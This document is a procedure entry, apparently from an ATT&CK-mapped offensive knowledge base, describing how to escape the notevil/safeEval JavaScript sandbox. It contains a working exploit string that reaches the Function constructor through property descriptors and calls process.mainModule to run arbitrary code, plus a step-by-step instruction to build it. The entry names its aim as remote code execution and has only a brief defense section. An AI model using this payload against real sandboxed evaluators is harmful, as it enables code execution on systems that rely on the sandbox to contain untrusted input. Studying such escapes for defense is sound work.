---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: Craft-Malicious-JavaScript-for-Sandbox-Escape
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.388Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - sandbox-escape
  - javascript
commands:
  - '[[commands/define-malicious-code-nodejs]]'
platforms:
  - Node.js
tools: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Craft-Malicious-JavaScript-for-Sandbox-Escape

## Summary

This procedure constructs a malicious JavaScript string that exploits the notevil sandbox by using Object.getOwnPropertyDescriptors to access and bind properties of the Function constructor, bypassing restrictions to enable arbitrary code execution.

## Description

The payload creates a dummy function, retrieves property descriptors from its prototype's constructor (Function), removes non-essential properties (like length, name, prototype), maps the remaining value properties to bind them with a custom string ('return this.process.mainModule.constructor._load(`util`).log(`pwned`)'), and invokes the resulting Function to escape the sandbox. This targets the bypass of commit 5974329712f0a527c5e16d3b9067a076e28e45f1. Expected outcome: Payload ready for safeEval, leading to RCE.

## Requirements

1. Node.js environment with safeEval loaded
2. Basic JavaScript knowledge for payload adaptation
3. Text editor or console for string construction

## Defense

Defensive measures and detection strategies:

- Wrap global constructors more thoroughly to prevent descriptor access
- Monitor for unusual Object.getOwnPropertyDescriptors calls in evaluated code
- Employ whitelisting for allowed AST nodes instead of blacklisting

## Objectives

1. Build payload exploiting prototype chain
2. Ensure compatibility with notevil's wrapping
3. Test payload syntax before execution

## Instructions

### Step 1: Define the Payload String

**Context**: Assemble the multi-part string for the sandbox escape logic.

**Command** ([[commands/define-malicious-code-nodejs]]):
```javascript
var code = "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();(Func())()";
```

> This creates the code variable with the full payload. Expected output: A string variable holding the exploit code.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/define-malicious-code-nodejs]]

## Tools Used


## Tags

- [[sandbox-escape]]
- [[JavaScript]]
